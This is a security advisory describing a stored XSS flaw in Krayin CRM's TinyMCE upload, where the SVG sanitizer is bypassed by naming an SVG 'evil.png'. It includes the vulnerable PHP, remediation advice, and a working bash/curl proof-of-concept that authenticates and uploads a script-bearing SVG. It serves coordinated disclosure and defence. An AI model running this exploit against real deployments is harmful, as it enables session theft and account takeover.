\# Stored XSS via SVG Sanitizer Bypass in TinyMCE Media Upload (Krayin CRM ≤ 2.2.5)



\## CVE Description



A stored cross-site scripting (XSS) vulnerability in the TinyMCE media upload functionality of Krayin CRM through 2.2.5 allows an authenticated user with TinyMCE upload permissions to bypass SVG sanitization and upload a malicious SVG file containing JavaScript. The vulnerability occurs because SVG detection relies on the client-controlled filename extension instead of the actual file content, allowing an attacker to upload SVG content using a non-SVG filename. The uploaded file is stored as an SVG on the public storage disk and served as `image/svg+xml`, resulting in JavaScript execution in the application origin.



\## Summary



Krayin implements SVG sanitization for TinyMCE uploads through the `Sanitizer` trait. However, the decision to apply sanitization is based on the client-supplied filename extension rather than trusted file content.



An attacker can upload an SVG payload named with a non-SVG extension, such as `evil.png`. The `isSvgFile()` validation returns false because it checks the user-controlled extension, causing the sanitizer to be skipped. The upload process later determines the file extension from the actual content and stores the file as an `.svg` file.



The resulting file is stored under the public storage directory:



```

/storage/tinymce/<hash>.svg

```



and served with:



```

Content-Type: image/svg+xml

```



Opening the URL executes the embedded JavaScript in the CRM origin.



This vulnerability represents a bypass of the SVG sanitizer protection and remains present in the TinyMCE upload path, independent from other upload-related fixes introduced in version 2.2.5.



\## Severity



\*\*High\*\*



\*\*CVSS v3.1:\*\* `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (\*\*8.7\*\*)



Stored XSS reachable by authenticated users with TinyMCE upload access. The stored payload is additionally accessible without authentication through the public `/storage` path.



\## Affected Versions



Confirmed on:



\- Krayin CRM 2.2.4

\- Krayin CRM 2.2.5



The vulnerable `TinyMCEController` implementation and `Sanitizer` trait behavior are identical across both versions.



\## Affected Component



\*\*Controller\*\*



```

Webkul\\Admin\\Http\\Controllers\\TinyMCEController

```



Methods:



```

upload()

storeMedia()

```



\*\*Trait\*\*



```

Webkul\\Core\\Traits\\Sanitizer

```



Methods:



```

isSvgFile()

sanitizeSvg()

```



\*\*Endpoint\*\*



```

POST /admin/tinymce/upload

```



\---



\## Technical Description



The upload routine stores the file using the server-detected extension:



```php

$extension = $file->extension();



$filename = md5($file->getClientOriginalName().time()).'.'.$extension;



$path = $file->storeAs(

&#x20;   $this->storagePath,

&#x20;   $filename

);

```



However, SVG detection relies on the client-controlled filename:



```php

public function isSvgFile(UploadedFile $file): bool

{

&#x20;   return str\_contains(

&#x20;       strtolower($file->getClientOriginalExtension()),

&#x20;       'svg'

&#x20;   );

}

```



An attacker can upload SVG content using a filename such as:



```

evil.png

```



The sanitizer check evaluates:



```

client extension = png

```



and skips sanitization.



The application later detects the real content type:



```

extension = svg

```



and stores:



```

<md5>.svg

```



The malicious SVG is then served as:



```

Content-Type: image/svg+xml

```



allowing embedded JavaScript execution.



\---



\## Proof of Concept



Authenticate as a user with TinyMCE upload access:



```bash

BASE=https://TARGET

CJ=$(mktemp)



LT=$(curl -s -c "$CJ" "$BASE/admin/login" \\

&#x20;| grep -oE 'name="\_token" value="\[^"]+"' \\

&#x20;| sed -E 's/.\*value="(\[^"]+)".\*/\\1/')



curl -s -b "$CJ" -c "$CJ" \\

&#x20; -o /dev/null \\

&#x20; -X POST "$BASE/admin/login" \\

&#x20; --data-urlencode "\_token=$LT" \\

&#x20; --data-urlencode "email=admin@example.com" \\

&#x20; --data-urlencode "password=admin123"



XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\\s+(\\S+)',open('$CJ').read()).group(1)))")



printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.png



curl -s -b "$CJ" \\

&#x20; -X POST "$BASE/admin/tinymce/upload" \\

&#x20; -H "X-XSRF-TOKEN: $XSRF" \\

&#x20; -H "Accept: application/json" \\

&#x20; -F "file=@evil.png;type=image/svg+xml"

```



\### Observed Result



The server returns a location similar to:



```

/storage/tinymce/<hash>.svg

```



Accessing the URL returns:



```

HTTP/200 OK

Content-Type: image/svg+xml

```



The SVG content remains unsanitized and the embedded JavaScript executes in the CRM origin.



The `/storage` URL does not require authentication.



\---



\## Impact



Successful exploitation allows an authenticated attacker with TinyMCE upload permissions to execute arbitrary JavaScript in the CRM application context.



Potential impacts include:



\- Session theft;

\- CSRF token exposure;

\- Performing actions as another user;

\- Administrative account compromise when accessed by privileged users;

\- Persistent malicious content hosted on the application domain.



\---



\## Suggested Remediation



\- Detect SVG files using trusted server-side content inspection instead of client-controlled filenames.

\- Always apply SVG sanitization based on actual file content.

\- Reject uploads when sanitization fails.

\- Avoid storing active content such as SVG files on publicly accessible storage.

\- Serve uploaded files using restrictive headers such as `Content-Disposition` and an appropriate Content Security Policy (CSP).



\---



\## Weakness Classification



\- \*\*Primary:\*\* CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

\- \*\*Root Cause:\*\* CWE-646 — Reliance on File Name or Extension of Externally-Supplied File

\- \*\*Contributing:\*\* CWE-434 — Unrestricted Upload of File with Dangerous Type

\- \*\*Additional:\*\* CWE-693 — Protection Mechanism Failure



\*\*VulDB Classification\*\*



```

Cross Site Scripting

```



\---



\## Disclosure



Reported privately under coordinated vulnerability disclosure.



Proof-of-concept, reproduction steps, and affected version evidence are available upon request.



Please credit the reporter and request a CVE identifier if applicable.

